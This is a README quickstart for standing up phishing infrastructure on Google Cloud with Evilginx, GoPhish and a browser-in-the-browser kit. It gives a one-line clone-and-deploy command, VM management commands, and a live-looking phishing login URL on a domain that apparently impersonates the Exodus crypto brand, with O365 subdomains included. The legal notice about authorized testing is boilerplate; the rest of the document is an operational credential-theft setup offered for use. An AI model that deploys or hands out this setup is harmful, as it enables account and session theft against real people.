# 🚀 START HERE - Google Cloud Shell Users

## ⚡ ONE COMMAND TO RULE THEM ALL

**You're in Google Cloud Shell? Perfect! Just run this:**

```bash
git clone https://github.com/waelmas/frameless-bitb.git && cd frameless-bitb && DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash gcp-deploy.sh
```

**THAT'S IT! Everything else is automated!**

---

## 🎯 What Happens Next?

1. **The script runs** (~2 minutes)
   - Creates GCP project
   - Reserves static IP
   - Shows you DNS records to configure

2. **Configure DNS** (~5 minutes)
   - Add DNS records shown by script
   - At your domain registrar (GoDaddy, Namecheap, etc.)

3. **Wait for installation** (~30-40 minutes)
   - VM gets created automatically
   - Software installs in background
   - You can close Cloud Shell (it keeps running!)

4. **Access your phishing infrastructure!**
   - Phishing page: `https://login.exodustraderai.info/?auth=2`
   - GoPhish admin: `https://YOUR_IP:3333`

---

## 📋 What You Get

### Infrastructure:
- ✅ VM Instance (e2-medium: 2 vCPU, 4 GB RAM)
- ✅ Static IP address
- ✅ Firewall configured (HTTP, HTTPS, DNS, GoPhish)
- ✅ Ubuntu 22.04 LTS
- ✅ 30 GB SSD storage

### Software:
- ✅ Evilginx (latest version)
- ✅ GoPhish 0.12.1
- ✅ Apache2 with SSL
- ✅ Frameless BITB
- ✅ All dependencies

### Domain: exodustraderai.info
- ✅ Base domain
- ✅ Wildcard subdomains
- ✅ Login subdomain (phishing page)
- ✅ All O365 subdomains

---

## 💰 Cost

**Monthly:**
- VM: ~$28/month
- Storage: ~$5/month
- Static IP: ~$3/month
- **Total: ~$36/month**

**FREE for 7-9 months with $300 GCP credit!**

---

## 🔍 Check Progress

### During Installation:

```bash
# SSH into your VM
gcloud compute ssh evilginx-server --zone=us-central1-a

# Watch installation
sudo tail -f /var/log/evilginx-startup.log
```

### After Installation:

```bash
# Check services
gcloud compute ssh evilginx-server --zone=us-central1-a --command='bitb-status'

# Validate setup
gcloud compute ssh evilginx-server --zone=us-central1-a --command='sudo bash /root/frameless-bitb/test-setup.sh'
```

---

## 🎮 Management

```bash
# SSH into VM
gcloud compute ssh evilginx-server --zone=us-central1-a

# Stop VM (saves money)
gcloud compute instances stop evilginx-server --zone=us-central1-a

# Start VM
gcloud compute instances start evilginx-server --zone=us-central1-a

# Delete VM
gcloud compute instances delete evilginx-server --zone=us-central1-a
```

---

## 🆘 Need Help?

### Quick Links:
- **Full Cloud Shell Guide**: [CLOUD-SHELL.md](CLOUD-SHELL.md)
- **Detailed GCP Setup**: [GCP-SETUP.md](GCP-SETUP.md)
- **Installation Guide**: [INSTALL.md](INSTALL.md)
- **Quick Reference**: [QUICKSTART.md](QUICKSTART.md)

### Common Issues:

**Cloud Shell disconnected?**
```bash
# No problem! Installation continues in background
# Just check progress:
gcloud compute ssh evilginx-server --zone=us-central1-a --command='sudo tail -f /var/log/evilginx-startup.log'
```

**Need to enable billing?**
- Go to: https://console.cloud.google.com/billing
- Link your billing account

**Services not starting?**
```bash
gcloud compute ssh evilginx-server --zone=us-central1-a
sudo bash /root/frameless-bitb/test-setup.sh
```

---

## ⚡ READY? LET'S GO!

**Copy this into Google Cloud Shell:**

```bash
git clone https://github.com/waelmas/frameless-bitb.git && cd frameless-bitb && DOMAIN=exodustraderai.info EMAIL=admin@exodustraderai.info bash gcp-deploy.sh
```

**Press Enter and follow the prompts!**

**45 minutes later: FULLY FUNCTIONAL PHISHING INFRASTRUCTURE! 🎣**

---

## ⚖️ Legal Notice

**FOR AUTHORIZED SECURITY TESTING ONLY!**

Only use this for:
- ✅ Authorized penetration testing
- ✅ Security awareness training
- ✅ Red team exercises (with permission)
- ✅ Security research

**Get written authorization before testing!**

Unauthorized access is illegal and can result in:
- Criminal charges
- Fines and imprisonment
- Civil lawsuits

**USE RESPONSIBLY!**

---

**LET'S FUCKING GO! 🚀🔥**
